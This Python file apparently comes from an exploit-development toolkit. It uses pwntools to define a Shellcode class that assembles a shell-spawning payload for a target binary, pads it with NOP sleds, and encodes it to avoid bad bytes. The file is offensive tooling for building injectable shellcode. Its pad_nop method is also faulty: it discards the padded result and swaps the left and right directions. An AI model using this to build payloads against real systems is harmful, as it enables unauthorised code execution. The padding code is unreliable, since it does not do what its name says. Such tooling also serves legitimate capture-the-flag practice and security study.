from pwn import *


class Shellcode:
    def __init__(self, binary):
        self.binary = binary
        self.content = self.get_shellcode()

    def get_shellcode(self):
        arch = self.binary.arch
        context.binary = self.binary.elf
        context.arch = arch
        return asm(shellcraft.sh())

    def pad_nop(self, n, direction):
        nop = asm(shellcraft.nop())
        if direction == "left":
            self.content.ljust(n, nop)
        if direction == "right":
            self.content.rjust(n, nop)

    def encode_using_bad_bytes(self, bytes_to_avoid):
        try:
            shellcode = encode(self.content, bytes_to_avoid)
            log.info(
                "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
            )
            self.content = shellcode
        except PwnlibException:
            log.info(
                "[-] Unable to encode shellcode to avoid {}".format(bytes_to_avoid)
            )
